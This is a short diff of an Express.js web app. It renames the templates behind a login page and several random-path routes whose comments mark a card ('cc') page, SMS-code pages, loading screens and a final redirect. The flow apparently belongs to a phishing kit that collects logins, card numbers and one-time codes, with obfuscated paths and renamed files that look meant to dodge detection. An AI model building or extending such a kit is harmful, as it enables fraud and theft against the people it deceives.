@@ -116,22 +116,22 @@ app.get("/",(req,res)=>{ // login
     res.render("index");
 });
 app.get("/3EtpVNHarRb8PqJfArbu",(req,res)=>{ // loading 1:
-    res.render("sisiliya");
+    res.render("chostika");
 });
 app.get("/KecdAK8hGCFkbAY2Qpnk",(req,res)=>{ // cc page:
-    res.render("loado1");
+    res.render("lopina1");
 });
 app.get("/BfhMN3hPfFL88zgqtPAk",(req,res)=>{ // loading 2:
-    res.render("smos1");
+    res.render("smikam1");
 });
 app.get("/jD9TUUwFtwdRXBh6P4cc",(req,res)=>{ // sms 1:
-    res.render("loado2");
+    res.render("lopina2");
 });
 app.get("/EEXnHMpMEHxNNMgX5Duh",(req,res)=>{ // loading 3:
-    res.render("smos2");
+    res.render("smikam2");
 });
 app.get("/Aw6knaPZ5nz4RnFvFV8s",(req,res)=>{ // done:
-    res.render("loado3",{url:process.env.URL});
+    res.render("lopina3",{url:process.env.URL});
 });
 
 
